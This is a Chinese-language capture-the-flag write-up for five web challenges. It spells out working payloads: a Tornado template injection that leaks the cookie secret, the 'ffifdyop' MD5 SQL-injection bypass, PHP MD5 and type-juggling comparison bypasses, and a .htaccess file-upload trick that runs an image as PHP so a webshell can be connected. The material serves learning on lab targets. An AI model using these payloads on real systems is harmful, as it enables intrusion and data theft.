# 1.[极客大挑战 2019]BuyFlag

本题打开之后点开MENU发现PAYFLAG,然后提示需要花一亿money买flag。 
F12发现源码，需要对password变量进行绕过，弱比较传参404a，同时上交money等于100000000，提交POST请求。
回显不是学生，抓包发现Cookie:user=0关键属性,尝试改成1,发现成功绕过。
但是显示数字太长,换用科学计数法1e10,得到flag。



# 2.[护网杯 2018]easy_tornado

文件名是tornado(python的一个模板),怀疑是模板注入。进入靶机后发现三个文件flag.txt,welcome.txt,hints.txt。点进去发现提示flag在**/fllllllllllllag**中,hints.txt提示filehash计算**md5(cookie_secret+md5(filename))** 所以关键是获取cookie_secret的值。

然后修改哈希值，发现报错，/error?msg=Error,说明可以在这个地方进行模板注入。

**模板注入必须通过传输型，如{{xxx}}执行命令**

尝试传入/error?msg={{9*9}},回显ORZ,证明了这就是tornado模板注入。

在tornado模板中，存在一些可以访问的快速对象，如handler指向RequestHandler,所以handler.settings就指向RequestHandler.settings了,而后者有一些环境变量。

传入**/error?msg={{handler.settings}}** 得到了cookie_secret,然后按要求加密得到filehash

```python
import hashlib
cookie_secret = '1d58e2b1-8b1c-494d-9d27-9319730f6811'
filename = '/fllllllllllllag'
filename = hashlib.md5(filename.encode()).hexdigest()
a = cookie_secret + filename
filehash = hashlib.md5(a.encode()).hexdigest()
print(filehash)
```

```
/file?filename=/fllllllllllllag&filehash=80ab93e35c9b472775d1141542200d26
```



# 3.[BJDCTF2020]Easy MD5

第一关发现一个提交框,使用BurpSuite抓包或者直接看F12找到Hint

```sql
select * from 'admin' where password=md5($pass,true)
select * from 'admin' where password='xxx'
```

```python
import hashlib
def md5_to_ascii(input):
    md5_hash = hashlib.md5(input.encode()).hexdigest()
    ascii_string = ''.join(chr(int(md5_hash[i:i+2], 16)) for i in range(0, len(md5_hash), 2))
    return ascii_string

text = 'ffifdyop'
ascii_text = md5_to_ascii(text)
print(ascii_text)

#输出'or'6É]é!r,ùíb
```

这里有一个关于php中md5函数的绕过,md5(ffifdyop,true)布尔型判断,若传入的md5经过hex转为十六字符二进制后,可以**直接在框中输入ffifdyop**来构造如下语句:

```sql
select * from 'admin' where password=''or'6É]é!r,ùíb'
```

不仅闭合了前面的查询语句,or后面的**'6É]é!r,ùíb'**因为开头是6,被判断为true,成功绕过检查。



第二关的页面没什么提示,于是抓包用Repeater模块获取页面信息,发现一段被注释的php代码

```php
<!--
$a = $GET['a'];
$b = $_GET['b'];

if($a != $b && md5($a) == md5($b)){    # md5弱比较绕过
    // wow, glzjin wants a girl friend.
-->
```

可以传入加密后开头是0exxxx(会被md5函数认为是0^xxxx,加密后都是0的md5值)的字符串

```
http://1f527c3d-3874-409b-80c8-dfa8f1de2488.node5.buuoj.cn:81/levels91.php?a=QNKCDZO&b=s878926199a
```

也传入用来绕过强比较的数组

```
http://1f527c3d-3874-409b-80c8-dfa8f1de2488.node5.buuoj.cn:81/levels91.php?a[]=1&b[]=0
```



第三关回显一段新的php代码

```php
<?php
error_reporting(0);
include "flag.php";

highlight_file(__FILE__);

if($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){
    echo $flag;
}
```

强比较,用数组绕过即可,但是要注意是POST请求

```POST
param1[]=1&param2[]=0
```



# 4.[ACTF2020 新生赛]BackupFile

进入后显示一句话**Try to find out source file!**,用御剑扫描得到index.php,访问下载index.php.bak,打开后发现一段php代码

```php
<?php
include_once "flag.php";

if(isset($_GET['key'])) {
    $key = $_GET['key'];
    if(!is_numeric($key)) {
        exit("Just num!");
    }
    $key = intval($key);
    $str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3";
    if($key == $str) {
        echo $flag;
    }
}
else {
    echo "Try to find out source file!";
}

?>
```

需要用GET传入key的值,在比较中因为$key是数字,所以$str会被隐性转换为整型,即123,所以只要传入**?key=123**即可



# 5.[MRCTF2020]你传你🐎呢

本题是文件上传漏洞,先上传隐藏png格式的php代码文件,尝试直接抓包修改后缀失败,重新发包成功上传至

```
http://ff0088aa-3a93-454b-9fa6-7395bb8308a5.node5.buuoj.cn:81/upload/e02521f1c5397452c73ec9bdae3eb0e0/11.png
```

这里要用到.htaccess文件,这个是一个解析指定文件为php的文件,内容为

```
<FilesMatch "1.png">
SetHandler application/x-httpd-php
</FilesMatch>
```

抓包并将格式改为image/png,成功上传。然后用蚁剑连接,在根目录下找到flag文件
